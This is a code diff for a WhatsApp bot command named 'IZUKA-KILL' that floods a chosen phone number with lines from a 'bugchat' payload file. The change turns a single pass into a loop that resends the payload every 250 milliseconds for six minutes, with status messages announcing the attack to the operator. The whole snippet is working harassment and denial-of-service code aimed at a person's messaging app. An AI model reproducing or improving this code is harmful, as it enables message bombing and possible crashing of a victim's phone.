@@ -51,18 +51,24 @@ cmd({
     const attackLines = bugchat.split('\n').filter(Boolean);
 
     await izuka.sendMessage(from, {
-      text: `🧠 *IZUKA-KILL ACTIVATED*\n\n👾 Targeting: *+${targetNumber}*\n🔋 Intensity: *${attackLines.length} Lines*\n\n⏳ Sending Payload...`
+      text: `🧠 *IZUKA-KILL ACTIVATED*\n\n👾 Targeting: *+${targetNumber}*\n🔋 Payload Size: *${attackLines.length} lines*\n🕕 Duration: *6 minutes*\n\n🚀 Starting Attack...`
     }, { quoted: mek });
 
-    for (let i = 0; i < attackLines.length; i++) {
-      await izuka.sendMessage(targetJid, {
-        text: `💥 *IZUKA PAYLOAD #${i + 1}*\n${attackLines[i]}\n\n🌀 _DAWENS ENGINE_`
-      }).catch(err => console.error(`❌ Fail to send #${i + 1}:`, err));
-      await new Promise(r => setTimeout(r, 250));
+    const startTime = Date.now();
+    let count = 0;
+
+    while (Date.now() - startTime < 6 * 60 * 1000) { // 6 minutes
+      for (let line of attackLines) {
+        await izuka.sendMessage(targetJid, {
+          text: `💥 *IZUKA PAYLOAD*\n${line}\n\n🔁 _DAWENS ENGINE_`
+        }).catch(err => console.error(`❌ Fail to send:`, err));
+        count++;
+        await new Promise(r => setTimeout(r, 250)); // 250ms delay between each message
+      }
     }
 
     await izuka.sendMessage(from, {
-      text: `✅ *ATTACK COMPLETE*\n\n💣 Sent ${attackLines.length} payloads to +${targetNumber}`
+      text: `✅ *ATTACK COMPLETE*\n\n📌 Duration: 6 minutes\n📤 Total Sent: ${count} messages to +${targetNumber}`
     }, { quoted: mek });
 
   } catch (error) {
